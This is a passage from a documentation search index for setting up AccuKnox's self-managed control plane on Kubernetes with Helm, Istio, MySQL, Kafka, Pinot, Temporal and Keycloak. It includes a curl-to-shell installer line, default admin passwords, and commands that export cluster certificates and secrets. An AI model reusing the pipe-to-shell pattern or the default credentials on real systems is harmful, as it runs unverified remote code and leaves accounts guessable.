monitoring"},{"location":"accuknox-onprem/monitoring/monitoring/#nodeselector-toleration","title":"Nodeselector &amp; Toleration","text":"<pre><code>Tolerations:\n- key:\u201dmonitoring\u201d\noperator: \u201cEqual\u201d\nvalue: \u201ctrue\u201d\neffect: \u201cNoSchedule\u201d\nNodeselector:\nmonitoring: \u201ctrue\u201d\n</code></pre> <p>Install Helm:</p> <ul> <li>Helm binary is required to proceed further. To install Click here..</li> </ul>"},{"location":"accuknox-onprem/monitoring/monitoring/#step-2-install-prometheus-and-grafana","title":"Step 2: Install Prometheus and Grafana","text":"<ul> <li>Add accuknox repository to install Prometheus &amp; Grafana helm package:</li> </ul> <pre><code>helm repo add accuknox-onprem-monitoring https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-monitoring\nhelm repo update\nhelm search repo accuknox-onprem-monitoring  \nhelm pull accuknox-onprem-monitoring/grafana-prometheus-stack --untar\nkubectl create namespace accuknox-monitoring \nkubectl config set-context --current --namespace=accuknox-monitoring \nhelm install prometheusmetrics grafana-prometheus-stack\n</code></pre> <pre><code>kubectl get pods -n accuknox-monitoring\n</code></pre>"},{"location":"accuknox-onprem/monitoring/monitoring/#step-3-grafana-login","title":"Step 3: Grafana Login","text":"<p>Note:</p> <p>Username: admin </p> <p>Password: prom-operator</p> <p>To Change Password:</p> <ul> <li>Scroll Down Below \u2192 Click on Admin Icon \u2192 Change Password</li> </ul> <p></p>"},{"location":"accuknox-onprem/monitoring/monitoring/#step-4-grafana-dashboards","title":"Step 4: Grafana Dashboards","text":"<ul> <li>Now Click on Dashboards Icon \u2192 Browse \u2192 Select the Dashboard</li> </ul> <p>List of Dashboards:</p> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/","title":"How to setup a On-prem cluster","text":""},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#overview","title":"Overview","text":"<p>This user journey guides you to set up end to end self-managed Accuknox control plane in the client infrastructure that provides complete control to manage, customize, and monitor Accunox control plane workloads.</p> <ol> <li> <p>Create a Kubernetes Cluster</p> </li> <li> <p>Install Pre-requistites</p> <p>2.1. Istio</p> <p>2.2. MySQL</p> <p>2.3. Kafka</p> <p>2.4. Pinot</p> <p>2.5. Temporal</p> </li> <li> <p>Install Core Components</p> </li> <li> <p>Install Accuknox UI</p> </li> <li> <p>Onboarding Steps</p> </li> </ol>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-1-create-a-kubernetes-cluster","title":"Step 1: Create a Kubernetes Cluster","text":"<ul> <li>Create a cluster with below hardware resources</li> </ul> Components Name MySQL Kafka Pinot Core Components Node pool name mySql kafka pinot microservices No. of nodes 3 3 3 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU per nodes 16 6 12 18 Memory per nodes 20 16 40 40 Disk size per nodes 50 50 50 50 Total CPU 48 18 36 54 Total Memory 60 48 120 120 Total Disk Size 150 150 150 150 Taints and Labels mysql:true kafka:true pinot:true NA"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-2-install-pre-requisites","title":"Step 2: Install Pre-requisites","text":"<p>Please wait for the cluster to be up and running (Ready State) and connect to the cluster and start installing prerequisites. </p>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#21-istio","title":"2.1 Istio","text":"<ul> <li>Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS)</li> </ul> <pre><code>curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.10.0 TARGET_ARCH=x86_64 sh -\n</code></pre> <ul> <li>Move to the Istio package directory. For example, if the package is istio-1.11.3</li> </ul> <pre><code>cd istio-1.10.0\n</code></pre> <ul> <li>Create a namespace istio-system for Istio components</li> </ul> <pre><code>kubectl create namespace istio-system\n</code></pre> <ul> <li>Install the Istio base chart which contains cluster-wide resources used by the Istio control plane</li> </ul> <pre><code>helm install istio-base manifests/charts/base -n istio-system\n</code></pre> <ul> <li>Install the Istio discovery chart which deploys the istiod control plane service</li> </ul> <pre><code>helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system\n</code></pre> <ul> <li>Install the Istio ingress gateway chart which contains the ingress gateway components</li> </ul> <p><pre><code>helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system\n</code></pre> Verify the Installation</p> <p>Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running</p> <p><pre><code>kubectl get pods -n istio-system\n</code></pre> </p> <p>Install Cert Manager</p> <ul> <li> <p>Install cert-manager. Cert-manager will manage the certificates of gateway domains.</p> </li> <li> <p>When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources.</p> </li> </ul> <pre><code>kubectl create clusterrolebinding cluster-admin-binding --clusterrole=cluster-admin --user=$(gcloud config get-value core/account)\n</code></pre> <ul> <li> <p>Install Cert Manager <pre><code>kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml\n</code></pre></p> </li> <li> <p>All pods should have in Running state</p> </li> </ul> <p><pre><code>kubectl get pods -n cert-manager\n</code></pre> </p> <p>Installing Gateway</p> <ul> <li>Add Accuknox Repositories to install helm packages</li> </ul> <pre><code>helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites\nhelm repo update\nhelm search repo accuknox-onprem-prerequisites\nhelm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar </code></pre> <ul> <li>Move to directory</li> </ul> <pre><code>cd istio-gateway-charts\n</code></pre> <ul> <li> <p>Istio Gateway configurations for DNS</p> </li> <li> <p>This gateway config file defines the base API endpoints of the microservices under DNS</p> </li> <li> <p>This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager</p> </li> </ul> <p>Find the Gateway IP</p> <pre><code>INGRESS_HOST=$(kubectl -n istio-system get service istio-ingressgateway -o\u00a0jsonpath='{.status.loadBalancer.ingress[0].ip}')\necho ${INGRESS_HOST}\n</code></pre> <p>Create DNS using IP</p> <ul> <li> <p>Create A record for example (api-onprem.accuknox.com and keycloak.example.com) using LoadBalancer IP</p> </li> <li> <p>Kindly update DNS records on cert.yaml, gateway-with-ssl.yaml, virtual-service.yaml files.</p> </li> <li> <p>Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honouring certificate signing requests.</p> </li> </ul> <pre><code>kubectl apply -f issuer.yaml\n# Should have Status as Ready\nkubectl get ClusterIssuer -n cert-manager\n</code></pre> <ul> <li>A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determines what will be honouring the certificate request.</li> </ul> <pre><code>kubectl apply -f cert.yaml\nkubectl get Certificate -n istio-system # Should have Status as Ready\n</code></pre> <ul> <li>Create Gateway with SSL <pre><code>kubectl apply -f gateway-with-ssl.yaml\n</code></pre></li> </ul> <p>Apply Virtual services</p> <ul> <li>A virtual service defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for the traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry.</li> </ul> <pre><code>kubectl apply -f backend-api/virtual-service.yaml\nkubectl apply -f keycloak/virtual-service.yaml\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#22-mysql","title":"2.2 Mysql","text":"<pre><code>helm pull accuknox-onprem-prerequisites/mysql-chart --untar\nkubectl create namespace accuknox-mysql\ncd mysql-chart\nkubectl apply -f bundle.yaml -n accuknox-mysql\nkubectl apply -f cr.yaml -n accuknox-mysql\nkubectl apply -f secrets.yaml -n accuknox-mysql\nkubectl apply -f ssl-secrets.yaml -n accuknox-mysql\n</code></pre> <p><pre><code>kubectl get secret -n accuknox-mysql | grep mysql\n</code></pre> </p> <p><pre><code>kubectl apply -f backup-s3.yaml -n accuknox-mysql\n</code></pre> Loading schema <pre><code>helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar\nhelm upgrade --install accuknox-mysql-schema\u00a0mysql-schema-chart -n accuknox-mysql\n</code></pre> Verify the installation</p> <p>Pods should be in Running state</p> <p><pre><code>kubectl get pods -n accuknox-mysql\n</code></pre> </p> <p>Note:</p> <ul> <li> <p>To configure backup with GCS, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml.</p> </li> <li> <p>HMAC Keys will vary for cloud providers. (GCP, AZURE, AWS)</p> </li> </ul> <ul> <li>After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the MySQL namespace</li> </ul> <pre><code>kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -n accuknox-mysql -- bash -il\nmysql -h accuknox-mysql-haproxy -uroot -proot_password\n</code></pre> <ul> <li>Update the passwords in secret.yaml file and run below command</li> </ul> <pre><code>kubectl apply -f secrets.yaml\n</code></pre> <p>Optional [Backup to S3 bucket]</p> <ul> <li>To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files.</li> </ul> <p>FQDN: For K8\u2019s Service name</p> <pre><code>accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#23-kafka","title":"2.3 kafka","text":"<pre><code>helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar\nhelm install accuknox-kafka\u00a0 strimzi-kafka-operator -n accuknox-kafka\n</code></pre> <ul> <li> <p>Check pods should be in the running status <pre><code>kubectl get pods -n accuknox-kafka\n</code></pre> </p> </li> <li> <p>Get Bootstrap server endpoint <pre><code>kubectl get kafka accuknox -o jsonpath='{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka\n</code></pre></p> </li> <li> <p>Get CA certificate <pre><code>kubectl get secret accuknox-cluster-ca-cert -o jsonpath='{.data.ca\\.p12}' -n accuknox-kafka | base64 -d &gt; ca.p12\n</code></pre></p> </li> </ul> <p>Note:</p> <ul> <li> <p>For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication.</p> </li> <li> <p>We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster.</p> </li> </ul> <ul> <li> <p>Get CA Password <pre><code>kubectl get secret accuknox-cluster-ca-cert -o jsonpath='{.data.ca\\.password}' -n accuknox-kafka | base64 -d &gt; ca.password\n</code></pre></p> </li> <li> <p>Get User Certificate <pre><code>kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath='{.data.user\\.p12}' | base64 -d &gt; user.p12\n</code></pre></p> </li> <li> <p>Get User Password <pre><code>kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath='{.data.user\\.password}' | base64 -d &gt; user.password\n</code></pre></p> </li> <li> <p>Convert user.p12 to base64 encoded format <pre><code>cat user.p12 | base64 &gt; user.p12.base64\n</code></pre></p> </li> <li> <p>Convert ca.p12 to base64 encoded format <pre><code>cat ca.password | base64 &gt; ca.password.base64\n</code></pre></p> </li> <li> <p>Convert user.password to base64 encoded format <pre><code>cat user.password | base64 &gt; user.password.base64\n</code></pre></p> </li> <li> <p>Convert p12 to pem format <pre><code>openssl pkcs12 -in ca.p12 -out ca.pem\n</code></pre> </p> </li> <li> <p>Copy the password from ca.password (file)</p> </li> <li> <p>Convert ca.pem to base64 encoded format <pre><code>cat ca.pem | base64 &gt; ca.pem.base64\n</code></pre></p> </li> </ul> <p>Note:</p> <ul> <li> <p>ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files.</p> </li> <li> <p>FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity.</p> </li> <li> <p>FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092</p> </li> </ul> <p>Get Certificates and store it</p> <ul> <li> <p>If the kafka cluster is upgraded or reinstalled, then the cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications.</p> </li> <li> <p>To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation).</p> </li> <li> <p>Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. </p> </li> </ul> <pre><code>kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka &gt; accuknox-clients-ca.yaml\nkubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka &gt; accuknox-clients-ca-cert.yaml\nkubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka &gt; accuknox-cluster-ca-cert.yaml\nkubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka &gt; accuknox-cluster-ca.yaml\nkubectl get secret/node-event-feeder -o yaml -n accuknox-kafka &gt; node-event-feeder.yaml\nkubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka &gt; node-event-feeder-common.yaml\n</code></pre> <p>Verify Kafka cluster <pre><code>kubectl get kafka -n accuknox-kafka\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#24-pinot","title":"2.4 Pinot","text":"<pre><code>helm pull accuknox-onprem-prerequisites/pinot-chart --untar\nkubectl create namespace accuknox-pinot\nhelm install accuknox-pinot pinot -n accuknox-pinot\n</code></pre> <p>Pods should be in running status <pre><code>kubectl get pods -n accuknox-pinot\n</code></pre> </p> <p>Loading Schema and Tables</p> <ul> <li>To load schema, It is necessary to open the Pinot dashboard. Run the below command to do port-forward and open http://localhost:9000/  in the browser.</li> </ul> <p><pre><code>kubectl port-forward svc/accuknox-pinot-controller -n accuknox-pinot 9000:9000\n</code></pre> </p> <ul> <li>Select Swagger REST API from the side panel</li> </ul> <p></p> <p>Schema Creation</p> <p>Download the pinot-schemas.zip file and unzip it and load all the schemas using below steps:</p> <p>Click to Download Pinot Schemas</p> <ul> <li>Under schema,  Select POST  /schemas Add a new schema</li> </ul> <p></p> <ul> <li>Click Try it out</li> </ul> <p></p> <ul> <li>Paste the schema file at body object and Execute</li> </ul> <p></p> <ul> <li>It should be 200 response codes and follow the same steps to create all schemas.</li> </ul> <p></p> <p>Tables Creation</p> <p>Download the pinot-table.zip file and unzip it. Please load all the tables using the below steps.</p> <p>Click to Download Pinot Tables</p> <ul> <li>Under TABLE Select POST /tables Add a new table.</li> </ul> <p></p> <ul> <li>Click Try it out</li> </ul> <p></p> <ul> <li>Paste Table configuration  file at body object and Execute</li> </ul> <p></p> <ul> <li>It should be 200 response codes and follow the same steps to create all tables.</li> </ul> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#25-temporal","title":"2.5 Temporal","text":"<ul> <li>Temporal operator deployment steps</li> </ul> <pre><code>kubectl create ns accuknox-temporal\ngit clone https://github.com/temporalio/helm-charts.git\nmv helm-charts temporal-server-chart\nhelm dep up temporal-server-chart\nhelm upgrade --install accuknox-temporal-server temporal-server-chart  --set server.replicaCount=1 --set cassandra.config.cluster_size=1 --set prometheus.enabled=false --set grafana.enabled=false --set elasticsearch.enabled=false --timeout 15m -n accuknox-temporal\n</code></pre> <ul> <li>If Prometheus/ Grafana is not required, Use the below command.</li> </ul> <pre><code>helm install --set server.replicaCount=1 --set cassandra.config.cluster_size=1 --set prometheus.enabled=false --set grafana.enabled=false --set elasticsearch.enabled=false temporal . --timeout 15m -n accuknox-temporal\nkubectl get all -n temporal-server\n</code></pre> <ul> <li>Set the namespace to Accuknox-temporal</li> </ul> <pre><code>kubectl exec -n accuknox-temporal -it  pod/temporaltest-admintools-&lt;pod-id&gt; -- /bin/bash\ntctl --ns accuknox-temporal n re\n</code></pre> <p>For example, </p> <ul> <li>Port-forward the temporal-web (:8088) pod to view the temporal workflows UI.</li> </ul> <pre><code>kubectl port-forward svc/accuknox-temporal-server-web 8088:8088 -n accuknox-temporal\n</code></pre>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-3-install-core-components","title":"Step 3: Install Core Components","text":"<p>Add Accuknox repository to install Core Components helm package:</p> <pre><code>helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services\nhelm repo update\nhelm search repo accuknox-onprem-services\n</code></pre> <p>Run the below script to install all the accuknox Core Components.</p> <p>Click to Download the Script</p> <p>All Pods should have the Running status</p> <p><pre><code>kubectl get pods -A\n</code></pre> </p> <p>Install Datapipeline API</p> <p>Run the below command to install the data pipeline API component</p> <pre><code>helm upgrade --install  accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts \\ \n--set prometheus.host=&lt;hostname&gt; \\\n--set prometheus.user=&lt;username&gt; \\\n--set prometheus.password=&lt;password&gt; \\\n-n accuknox-datapipeline-api\n</code></pre> <p>prometheus.host - specify prometheus host name</p> <p>prometheus.user - specify prometheus username</p> <p>prometheus.password - specify prometheus password</p> <ul> <li>Pods should be in Running status</li> </ul> <pre><code>kubectl get pods -n accuknox-datapipeline-api\n</code></pre> <p></p> <p>Install shared-informer-service</p> <ul> <li>Install Nginx ingress controller</li> </ul> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.1/deploy/static/provider/cloud/deploy.yaml\n</code></pre> <ul> <li>Ingress Nginx controller external IP should mapped with DNS A record like sis-api.accuknox.com</li> </ul> <p><pre><code>kubectl get svc -n ingress-nginx\n</code></pre> </p> <p>Run the below command to install the shared-informer-service component</p> <ul> <li>For host variable need to map with DNS name</li> </ul> <pre><code>helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart/\n             -n accuknox-shared-informer-service\n             --set host=&lt;sis-api.accuknox.com&gt;\n</code></pre> <ul> <li>Pods should be in Running status</li> </ul> <p><pre><code>kubectl get pods -n accuknox-shared-informer-service\n</code></pre> </p> <pre><code>kubectl get ingress -n accuknox-shared-informer-service\n</code></pre> <p></p> <p>Install Knoxautopolicy</p> <p>Run the below command to pull the  Knoxautopolicy helm chart</p> <pre><code>helm pull accuknox-onprem-services/knox-auto-policy-chart --untar\n</code></pre> <ul> <li> <p>Copy the password from user.password file </p> </li> <li> <p>Copy  the ca.pem.base64 and user.p12.base64  file &amp; paste  in to  templates/secrets.yaml file in Knoxautopolicy-chart.</p> </li> </ul> <p></p> <ul> <li> <p>cluster-management-url value will be istio gateway host eg. https://api-onprem.accuknox.com</p> </li> <li> <p>For user_password variable need to map with kafka user.password file content</p> </li> </ul> <pre><code>helm install knox-auto-policy-chart \\\naccuknox-onprem-services/knox-auto-policy-chart \\\n--set config.application.cluster.cluster-mgmt-url= &lt;cluster-management-url&gt; \\   --set config.feed-consumer.kafka.keystore.pword=&lt;user_password&gt; \\\n-n accuknox-knoxautopolicy </code></pre> <p>Pods should be in Running status</p> <p><pre><code>kubectl get pods -n accuknox-knoxautopolicy\n</code></pre> </p> <p>Configure Keycloak</p> <ul> <li> <p>Click to Download the Accuknox UI config file</p> </li> <li> <p>Open Keycloak using the URL configured</p> </li> </ul> <p>eg. keycloak.example.com</p> <p></p> <ul> <li> <p>Click on administration console default username \u2192 admin | default password \u2192 admin </p> </li> <li> <p>Click master add the realm</p> </li> </ul> <p></p> <ul> <li>Click on the Realm settings \u2192 General  section</li> </ul> <p></p> <ul> <li>Click on the login section</li> </ul> <p></p> <ul> <li>Click on the tokens section and please configure same as below images</li> </ul> <p> </p> <ul> <li>Click Clients \u2192  click create to import the files and upload the below accuknox-ui-zip folder files.</li> </ul> <p></p> <ul> <li>Click on accukox-ui</li> </ul> <p></p> <ul> <li>Click on a credential</li> </ul> <p></p> <ul> <li> <p>Get the client secret and client id for install user-management</p> </li> <li> <p>Click on the service account roles </p> </li> <li> <p>Click on client roles \u2192  select account \u2192  select all the available roles \u2192  click add selected. </p> </li> <li> <p>Click on the broker and select the available roles and click on add selected </p> </li> <li> <p>Click on realm-management and select all the available roles and add  </p> </li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-4-install-accuknox-ui","title":"Step 4: Install Accuknox UI","text":"<p>It is mandatory to have Istio API Gateway Endpoint before deploying Accuknox UI. Attach the API gateway in Accuknox UI.  </p> <ul> <li> <p>Ingress Nginx controller external IP should mapped with DNS A record like app-onprem.accuknox.com <pre><code>kubectl get svc -n ingress-nginx\n</code></pre> </p> </li> <li> <p>UI Installation using helm <pre><code>helm upgrade --install accuknox-ui accuknox-onprem-services/accuknox-ui --set ingress.hostaname=&lt;ui-hostname&gt;\n</code></pre></p> </li> <li> <p>ClusterIssuer should be in Ready state <pre><code>kubectl get ClusterIssuer\n</code></pre> </p> </li> <li> <p>Everything should be in Running status <pre><code>kubectl get pod\n</code></pre> <pre><code>kubectl get ingress\n</code></pre> </p> </li> </ul> <p>Install user management</p> <ul> <li> <p>For client_id and client_secret has to be taken from keycloak configuration  <pre><code>helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service-chart\n             --set config.ui.host=&lt;app.accuknox.com&gt; --set config.client_secret=&lt;client_secret&gt;\n             --set config.client_id=&lt;client_id&gt;\n             -n accuknox-user-mgmt\n</code></pre></p> </li> <li> <p>Pods should be in Running status <pre><code>kubectl get pods -n accuknox-user-mgmt\n</code></pre> </p> </li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#login-screen","title":"Login Screen","text":""},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-5-onboarding-steps","title":"Step 5: Onboarding Steps","text":"<p>Onboard your K8\u2019s Cluster into AccuKnox Control Plane </p>"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#to-know-more","title":"To know more","text":"<ul> <li>Setup Monitoring for On-prem </li> <li>Setup Loki Logging Tool for On-prem</li> <li>Setup ELK Logging Tool for On-prem</li> <li>Ship logs directly to Accuknox ELK</li> <li>Ship logs directly to Accuknox Splunk</li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/create-cluster/","title":"Create a cluster with the below hardware resources","text":"Components Name MySQL Kafka Pinot Core Components Node pool name mySql kafka pinot microservices No. of nodes 3 3 3 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU per nodes 16 6 12 18 Memory per nodes 20 16 40 40 Disk size per nodes 50 50 50 50 Total CPU 48 18 36 54 Total Memory 60 48 120 120 Total Disk Size 150 150 150 150 Taints and Labels mysql:true kafka:true pinot:true NA"},{"location":"accuknox-onprem/onprem-setup-steps/install-accuknox-ui/","title":"Install accuknox ui","text":"<ul> <li>Ingress Nginx controller external IP should mapped with DNS A record like app-onprem.accuknox.com</li> </ul> <p><pre><code>kubectl get svc -n ingress-nginx\n</code></pre> </p> <ul> <li>UI Installation using helm <pre><code>helm upgrade --install accuknox-ui accuknox-onprem-services/accuknox-ui --set ingress.hostaname=&lt;ui-hostname&gt;\n</code></pre></li> <li>ClusterIssuer should be in Ready state</li> </ul> <p><pre><code>kubectl get ClusterIssuer\n</code></pre> </p> <ul> <li>Everything should be in Running status <pre><code>kubectl get pod\n</code></pre> <pre><code>kubectl get ingress\n</code></pre> </li> </ul>"},{"location":"accuknox-onprem/onprem-setup-steps/install-accuknox-ui/#install-user-management","title":"Install user management","text":"<ul> <li>For client_id and client_secret has to be taken from keycloak configuration </li> </ul> <p><pre><code>helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service-chart\n             --set config.ui.host=&lt;app.accuknox.com&gt; --set config.client_secret=&lt;client_secret&gt;\n             --set config.client_id=&lt;client_id&gt;\n             -n accuknox-user-mgmt\n</code></pre> + Pods should be in Running status <pre><code>kubectl get pods -n accuknox-user-mgmt\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/install-accuknox-ui/#login-screen","title":"Login Screen","text":""},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/","title":"Install core components","text":"<p>Add Accuknox repository to install Core Components helm package:</p> <pre><code>helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services\nhelm repo update\nhelm search repo accuknox-onprem-services\n</code></pre> <p>Please run the below script to install all the accuknox Core Components.</p> <p>Click to Download the Script</p> <p>All Pods should have the Running status</p> <p><pre><code>kubectl get pods -A\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#install-datapipeline-api","title":"Install Datapipeline API","text":"<p>Run the below command to install the data pipeline API component</p> <pre><code>helm upgrade --install  accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts \\ \n--set prometheus.host=&lt;hostname&gt; \\\n--set prometheus.user=&lt;username&gt; \\\n--set prometheus.password=&lt;password&gt; \\\n-n accuknox-datapipeline-api\n</code></pre> <p>prometheus.host - specify prometheus host name</p> <p>prometheus.user - specify prometheus username</p> <p>prometheus.password - specify prometheus password</p> <ul> <li>Pods should be in Running status</li> </ul> <pre><code>kubectl get pods -n accuknox-datapipeline-api\n</code></pre> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#install-shared-informer-service","title":"Install shared-informer-service","text":"<ul> <li>Install Nginx ingress controller</li> </ul> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.1/deploy/static/provider/cloud/deploy.yaml\n</code></pre> <ul> <li>Ingress Nginx controller external IP should mapped with DNS A record like sis-api.accuknox.com</li> </ul> <p><pre><code>kubectl get svc -n ingress-nginx\n</code></pre> </p> <p>Run the below command to install the shared-informer-service component</p> <ul> <li>For host variable need to map with DNS name</li> </ul> <p><pre><code>helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart/\n             -n accuknox-shared-informer-service\n             --set host=&lt;sis-api.accuknox.com&gt;\n</code></pre> + Pods should be in Running status</p> <p><pre><code>kubectl get pods -n accuknox-shared-informer-service\n</code></pre> </p> <pre><code>kubectl get ingress -n accuknox-shared-informer-service\n</code></pre> <p></p>"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#install-knoxautopolicy","title":"Install Knoxautopolicy","text":"<p>Run the below command to pull the  Knoxautopolicy helm chart</p> <pre><code>helm pull accuknox-onprem-services/knox-auto-policy-chart --untar\n</code></pre> <ul> <li> <p>Copy the password from user.password file </p> </li> <li> <p>Copy  the ca.pem.base64 and user.p12.base64  file &amp; paste  in to  templates/secrets.yaml file in Knoxautopolicy-chart.</p> </li> </ul> <p></p> <ul> <li> <p>cluster-management-url value will be istio gateway host eg. https://api-onprem.accuknox.com</p> </li> <li> <p>For user_password variable need to map with kafka user.password file content</p> </li> </ul> <pre><code>helm install knox-auto-policy-chart \\\naccuknox-onprem-services/knox-auto-policy-chart \\\n--set config.application.cluster.cluster-mgmt-url= &lt;cluster-management-url&gt; \\   --set config.feed-consumer.kafka.keystore.pword=&lt;user_password&gt; \\\n-n accuknox-knoxautopolicy </code></pre> <p>Pods should be in Running status</p> <p><pre><code>kubectl get pods -n accuknox-knoxautopolicy\n</code></pre> </p>"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#configure-keycloak","title":"Configure Keycloak","text":"<p>Click to Download the Accuknox UI config file</p> <ul> <li>Open Keycloak using the URL configured</li> </ul> <p>eg. keycloak.example.com</p> <p></p> <ul> <li> <p>Click on administration console default username \u2192 admin | default password \u2192 admin </p> </li> <li> <p>Click master add the realm</p> </li> </ul> <p></p> <ul> <li>Click on the Realm settings \u2192 General  section</li> </ul> <p></p> <ul> <li>Click on the login section</li> </ul> <p></p> <ul> <li>Click on the tokens section and please configure same as below images</li> </ul> <p> </p> <ul> <li>Click Clients \u2192  click create to import the files and upload the below accuknox-ui-zip folder files.</li> </ul> <p></p> <ul> <li>Click on accukox-ui</li> </ul> <p></p> <ul> <li>Click on a credential</li> </ul> <p></p> <p>Note: Kindly copy and paste the client secret and client id for install user-management</p> <ul> <li> <p>Click on the service account roles </p> </li> <li> <p>Click on client roles \u2192  select account \u2192  select all the available roles \u2192  click add selected. </p> </li> <li> <p>Click on the broker and select the available roles and click on add selected </p> </li> </ul> <p>Click on realm-management and select all the available roles and add  </p>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/","title":"Istio","text":"<p>Please wait for the cluster to be up and running (Ready State) and connect to the cluster and start installing prerequisites. </p>"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#installing-istio","title":"Installing Istio","text":"<ul> <li>Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS)</li> </ul> <pre><code>curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.10.0 TARGET_ARCH=x86_64 sh -\n</code></pre> <ul> <li>Move to the Istio package directory. For example, if the package is istio-1.11.3</li> </ul> <pre><code>cd istio-1.10.0\n</code></pre> <ul> <li>Create a namespace istio-system for Istio components</li> </ul> <pre><code>kubectl create namespace istio-system\n</code></pre> <ul> <li>Install the Istio base chart which contains cluster-wide resources used by the Istio control plane</li> </ul> <pre><code>helm install istio-base manifests/charts/base -n 